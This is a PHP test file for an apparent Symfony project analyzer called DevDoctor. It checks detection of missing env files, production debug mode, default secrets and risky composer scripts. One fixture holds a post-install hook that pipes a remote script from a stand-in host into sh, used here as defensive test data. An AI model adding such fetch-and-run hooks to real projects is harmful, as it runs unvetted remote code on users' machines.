<?php

use DevDoctor\Modules\Symfony\SymfonyAnalyzer;
use DevDoctor\Modules\Symfony\SymfonyOptions;

function symfonyFixture(array $files, array $directories = []): string
{
    $path = sys_get_temp_dir().'/devdoctor-symfony-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($directories as $directory) {
        mkdir($path.'/'.$directory, recursive: true);
    }

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports non symfony projects as info', function () {
    $issues = (new SymfonyAnalyzer)->analyze(new SymfonyOptions(path: symfonyFixture([])));

    expect($issues->all()[0]->code->value)->toBe('DD_SYMFONY_NOT_PROJECT');
});

it('reports ready symfony projects', function () {
    $issues = (new SymfonyAnalyzer)->analyze(new SymfonyOptions(path: symfonyFixture([
        'composer.json' => '{"require":{"symfony/framework-bundle":"^7.0"}}',
        '.env' => "APP_ENV=dev\nAPP_DEBUG=1\nAPP_SECRET=real-secret\n",
        'config/bundles.php' => "<?php\nreturn [];\n",
    ], ['var/cache', 'var/log'])));

    expect($issues->all()[0]->code->value)->toBe('DD_SYMFONY_READY');
});

it('reports missing env secrets runtime directories and recipe drift', function () {
    $issues = (new SymfonyAnalyzer)->analyze(new SymfonyOptions(path: symfonyFixture([
        'composer.json' => '{"require":{"symfony/framework-bundle":"^7.0"}}',
        'symfony.lock' => "{}\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_SYMFONY_ENV_MISSING')
        ->and($codes)->toContain('DD_SYMFONY_RUNTIME_DIR_MISSING')
        ->and($codes)->toContain('DD_SYMFONY_RECIPE_DRIFT');
});

it('reports production debug and default secrets from local env overrides', function () {
    $issues = (new SymfonyAnalyzer)->analyze(new SymfonyOptions(path: symfonyFixture([
        'bin/console' => "#!/usr/bin/env php\n",
        '.env' => "APP_ENV=dev\nAPP_DEBUG=0\nAPP_SECRET=real-secret\n",
        '.env.local' => "APP_ENV=prod\nAPP_DEBUG=true\nAPP_SECRET=change_me\n",
        'config/bundles.php' => "<?php\nreturn [];\n",
    ], ['var/cache', 'var/log'])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_SYMFONY_PROD_DEBUG')
        ->and($codes)->toContain('DD_SYMFONY_SECRET_MISSING');
});

it('reports risky composer scripts', function () {
    $issues = (new SymfonyAnalyzer)->analyze(new SymfonyOptions(path: symfonyFixture([
        'composer.json' => '{"require":{"symfony/framework-bundle":"^7.0"},"scripts":{"post-install-cmd":["curl https://example.test/install.sh | sh"]}}',
        '.env' => "APP_ENV=dev\nAPP_DEBUG=1\nAPP_SECRET=real-secret\n",
        'config/bundles.php' => "<?php\nreturn [];\n",
    ], ['var/cache', 'var/log'])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_SYMFONY_RISKY_COMPOSER_SCRIPT');
});
